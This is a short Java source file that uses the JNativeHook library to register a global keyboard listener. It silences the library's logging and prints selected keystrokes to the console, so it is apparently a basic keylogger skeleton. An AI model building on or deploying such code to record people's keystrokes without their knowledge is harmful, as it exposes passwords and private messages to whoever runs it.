package main;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Main implements NativeKeyListener {
	
	public static void main(String[] args) {
		try {
		GlobalScreen.registerNativeHook();
		} catch (NativeHookException e ) {
			e.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new Main());
		
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);

		// Change the level for all handlers attached to the default logger.
		Handler[] handlers = Logger.getLogger("").getHandlers();
		for (int i = 0; i < handlers.length; i++) {
			handlers[i].setLevel(Level.OFF);
		}
		
	    }

	    @Override
	    public void nativeKeyPressed(NativeKeyEvent e) {
			
			if(Tools.containsLoggerKey(NativeKeyEvent.getKeyText(e.getKeyCode())) == false) {
	    		//does nothing, except keep useless keys from outputting
	    	}else {
	    		// save the output of the following keys here
	    		System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()) + "" );
	    	}
	    }

	    @Override
	    public void nativeKeyReleased(NativeKeyEvent e) {
	    	//System.out.println("KeyReleased " + NativeKeyEvent.getKeyText(e.getKeyCode()));

	    }

	    @Override
	    public void nativeKeyTyped(NativeKeyEvent e) {
	    
		
		}

}